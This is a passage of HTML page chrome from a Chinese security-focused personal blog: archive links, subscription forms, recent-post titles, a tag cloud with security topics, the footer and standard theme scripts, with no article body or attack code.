class="menu-list"><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">十二月 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/07/"><span class="level-start"><span class="level-item">七月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/05/"><span class="level-start"><span class="level-item">五月 2019</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/03/"><span class="level-start"><span class="level-item">三月 2019</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/01/"><span class="level-start"><span class="level-item">一月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/12/"><span class="level-start"><span class="level-item">十二月 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/07/"><span class="level-start"><span class="level-item">七月 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/06/"><span class="level-start"><span class="level-item">六月 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/05/"><span class="level-start"><span class="level-item">五月 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-25T08:05:05.000Z">2022-02-25</time></p><p class="title"><a href="/2022/02/25/Gallery/">Gallery</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-15T08:34:16.000Z">2022-02-15</time></p><p class="title"><a href="/2022/02/15/ctf-wp-saining/">ctf-wp-saining</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">安全竞赛</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-12-29T02:34:17.000Z">2021-12-29</time></p><p class="title"><a href="/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/">Log4j2基于JDBCAPPENDER配置文件任意文件执行(CVE-2021-44832)</a></p><p class="categories"><a href="/categories/Security/">Security</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-12-28T06:16:20.000Z">2021-12-28</time></p><p class="title"><a href="/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/">内网渗透之代理转发</a></p><p class="categories"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-12-27T06:15:17.000Z">2021-12-27</time></p><p class="title"><a href="/2021/12/27/config/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/">关于VMware磁盘镜像导入ESXi的方法</a></p></div></article></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/74cms/"><span class="tag">74cms</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Flask/"><span class="tag">Flask</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MsSQL/"><span class="tag">MsSQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MySQL/"><span class="tag">MySQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Oracle/"><span class="tag">Oracle</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">PHP反序列化</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7/"><span class="tag">PHP语言特性</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Pickle/"><span class="tag">Pickle</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PyYaml/"><span class="tag">PyYaml</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Redis/"><span class="tag">Redis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SCTF2021/"><span class="tag">SCTF2021</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSRF/"><span class="tag">SSRF</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSTI/"><span class="tag">SSTI</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apt/"><span class="tag">apt</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cmake/"><span class="tag">cmake</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/docker/"><span class="tag">docker</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/jboss/"><span class="tag">jboss</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/log4j2/"><span class="tag">log4j2</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mysql/"><span class="tag">mysql</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/redis/"><span class="tag">redis</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/shiro/"><span class="tag">shiro</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql-injection/"><span class="tag">sql-injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/thinkphp3/"><span class="tag">thinkphp3</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/thinkphp5/"><span class="tag">thinkphp5</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tools/"><span class="tag">tools</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ubuntu/"><span class="tag">ubuntu</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"><span class="tag">代理转发</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><span class="tag">信息收集</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="tag">内网渗透</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"><span class="tag">博客迁移</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BC%B9shell/"><span class="tag">反弹shell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/"><span class="tag">图床配置</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8A%A4%E7%BD%91%E6%BC%94%E7%BB%83/"><span class="tag">护网演练</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"><span class="tag">数据库提权</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"><span class="tag">溯源分析</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB/"><span class="tag">知识体系</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"><span class="tag">端口转发</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BA%A2%E5%B8%BD%E6%9D%AF/"><span class="tag">红帽杯</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/"><span class="tag">红日靶场</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"><span class="tag">网鼎杯</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"><span class="tag">面试题</span><span class="tag">1</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">greetdawn&#039;s Site</a><p class="is-size-7"><span>&copy; 2022 丨greetdawn丨</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Greetdawn"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>